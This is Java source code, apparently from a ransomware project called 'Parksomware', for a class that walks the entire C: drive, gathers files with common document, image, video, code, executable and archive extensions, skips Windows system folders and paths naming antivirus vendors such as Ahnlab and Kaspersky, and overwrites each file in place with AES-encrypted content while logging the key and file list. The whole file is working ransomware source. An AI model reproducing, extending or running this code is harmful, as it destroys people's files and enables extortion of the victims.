package kr.pah;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;

public class Encrypt {

    private static final String KEY = UUID.randomUUID().toString().replaceAll("-", "");
    private static final List<String> EXTENSIONS = Arrays.asList(
            ".doc", ".docx", ".pdf", ".txt", ".ppt", ".pptx", ".xls", ".xlsx", ".csv",
            ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg",
            ".mp4", ".avi", ".mov", ".wmv", ".flv", ".swf", ".mkv",
            ".exe", ".msi", ".dll",
            ".java", ".py", ".js", ".cpp", ".c", ".cs", ".rb", ".php", ".go", ".rs", ".swift",
            ".html", ".css", ".scss", ".less", ".ts", ".vue", ".json", ".xml",
            ".sh", ".bat", ".cmd", ".ps1",
            ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz"
    );

    private static final List<String> EXCLUDED_FOLDERS = Arrays.asList(
            "C:\\Windows",
            System.getenv("APPDATA") + "\\Parksomware",
            "C:\\$Recycle.Bin",
            "C:\\$WinREAgent",
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\ProgramData",
            System.getenv("userprofile") + "\\Appdata\\Local"
    );

    private static final List<String> EXCLUDED_KEYWORDS = Arrays.asList(
            "Estsoft",
            "Ahnlab",
            "Kaspersky Lab",
            "Windows",
            "Microsoft"
    );

    public static void main() {
        runEncryption();
        System.out.println("KEY = " + KEY);
    }

    public static void runEncryption() {
        List<File> filesToEncrypt = new ArrayList<>();
        File root = new File("C:\\");

        collectFiles(root, filesToEncrypt);

        Collections.sort(filesToEncrypt, Comparator.comparingInt(file -> file.getPath().length()));
        Collections.reverse(filesToEncrypt);

        List<String> encryptedFiles = new ArrayList<>();

        for (File file : filesToEncrypt) {
            try {
                encryptFile(file);
                encryptedFiles.add(file.getAbsolutePath());
            } catch (Exception ignored) {
            }
        }

        try (FileWriter writer = new FileWriter(System.getenv("APPDATA") + "\\Parksomware\\encrypted.txt")) {
            writer.write(KEY + System.lineSeparator());
            for (String filePath : encryptedFiles) {
                writer.write(filePath + System.lineSeparator());
            }
        } catch (Exception ignored) {
        }
    }

    private static void collectFiles(File directory, List<File> files) {
        String dirPath = directory.getAbsolutePath();

        if (isExcludedFolder(dirPath) || containsExcludedKeyword(dirPath) || containsSpecialCharacters(dirPath)) {
            return;
        }

        File[] found = directory.listFiles();
        if (found != null) {
            for (File file : found) {
                if (file.isDirectory()) {
                    collectFiles(file, files);
                } else {
                    if (hasValidExtension(file.getName())) {
                        files.add(file);
                    }
                }
            }
        }
    }

    private static boolean isExcludedFolder(String dirPath) {
        return EXCLUDED_FOLDERS.stream().anyMatch(folder -> dirPath.toLowerCase().startsWith(folder.toLowerCase()));
    }

    private static boolean containsExcludedKeyword(String dirPath) {
        return EXCLUDED_KEYWORDS.stream().anyMatch(keyword -> dirPath.toLowerCase().contains(keyword.toLowerCase()));
    }

    private static boolean containsSpecialCharacters(String dirPath) {
        return dirPath.matches(".*[^a-zA-Z0-9\\\\\\/: \\-_.()\\[\\]{}~\\uAC00-\\uD7AF].*");
    }

    private static boolean hasValidExtension(String fileName) {
        String lowerCaseFileName = fileName.toLowerCase();
        return EXTENSIONS.stream().anyMatch(extension -> lowerCaseFileName.endsWith(extension));
    }

    private static void encryptFile(File file) {
        try {
            Path filePath = file.toPath();
            byte[] fileContent = Files.readAllBytes(filePath);
            byte[] encryptedContent = encrypt(fileContent);
            Files.write(filePath, encryptedContent);
        } catch (Exception ignored) {
        }
    }

    private static byte[] encrypt(byte[] data) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        SecretKeySpec secretKey = new SecretKeySpec(KEY.getBytes(), "AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        return cipher.doFinal(data);
    }
}
